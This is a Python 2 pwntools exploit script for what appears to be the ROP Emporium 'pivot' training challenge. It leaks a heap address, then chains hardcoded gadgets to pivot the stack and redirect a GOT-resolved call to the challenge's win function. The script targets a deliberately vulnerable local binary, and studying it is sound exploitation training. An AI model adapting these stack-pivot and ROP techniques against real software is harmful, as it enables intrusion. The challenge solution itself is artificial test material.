#!/usr/bin/env python2
from pwn import *

p = process("./pivot")

leak_addr = p.recvline_contains("The Old Gods").strip().rsplit(' ', 1)[1]
heap_addr = u64(unhex(leak_addr[2:]).rjust(8, '\x00'), endian='big')
log.info("Heap address is: 0x%x" % heap_addr)

# Gadgets
xchg_rax_rsp = p64(0x00400b02)
pop_rax = p64(0x00400b00)
mov_rax_qlrax = p64(0x00400b05)
pop_rbp = p64(0x00400900)
add_rax_rbp = p64(0x00400b09)
call_rax = p64(0x0040098e)
# Offsets
foothold_plt = p64(0x00400850)
foothold_got = p64(0x00602048)
puts_plt = p64(0x00400800)
main = p64(0x00400996)

buf = "A"*40
buf += pop_rax
buf += p64(heap_addr)
buf += xchg_rax_rsp

rop = foothold_plt
rop += pop_rax
rop += foothold_got
rop += mov_rax_qlrax
rop += pop_rbp
rop += p64(0x14e)
rop += add_rax_rbp
rop += call_rax

p.recvuntil("land there")
p.sendline(rop)
p.recvuntil("stack smash")
p.sendline(buf)
print p.recvall()
# sym.ret2win - sym.foothold_function = 0x14e
